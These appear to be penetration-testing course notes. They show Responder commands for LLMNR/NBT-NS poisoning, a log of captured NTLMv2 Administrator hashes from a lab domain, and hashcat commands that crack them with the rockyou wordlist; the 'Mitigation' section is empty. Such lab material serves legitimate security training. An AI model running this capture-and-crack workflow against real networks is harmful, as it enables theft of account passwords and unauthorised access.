
PSA/Fix: Responder Using the command `sudo responder -I eth0 -dwPv` to start up responder no longer works due to the updates made to it. This wasn't an issue at the time of the recording of the videos. A simple solution is to use `-dwv` or `-dPv`. Ex:

`sudo responder -I eth0 -dwv`


use responder, 

`sudo responder -I tun0 -dwP`

or whatever interface is being used and then put your IP in the persons file explorer


```
kali@kali /u/s/r/logs> cat SMB-NTLMv2-SSP-fe80::8552:baa6:b3c9:f191.txt
Administrator::MARVEL:96ce47b50235066e:87EBB44F66DBCEA303D8E8A1FF959CE1:
Administrator::MARVEL:9de778743f20855a:B3B4F318F7EC815DB464B974BD2D6103:
Administrator::MARVEL:b44c8bf18f23052f:788DD22DFC0CBCEE23B98773F8F3C2CD:
Administrator::MARVEL:1109a2d1f724e1bb:9CADC7DDCC19BD04788796B1394D7163:
kali@kali /u/s/r/logs> pwd
/usr/share/responder/logs
```


to crack


```
hashcat -m 5600 <hashes> /usr/share/wordlists/rockyou.txt
```


```
hashcat -m 5600 <hashes> /usr/share/wordlists/rockyou.txt -r OneRule #also works and is very good
```



# Mitigation
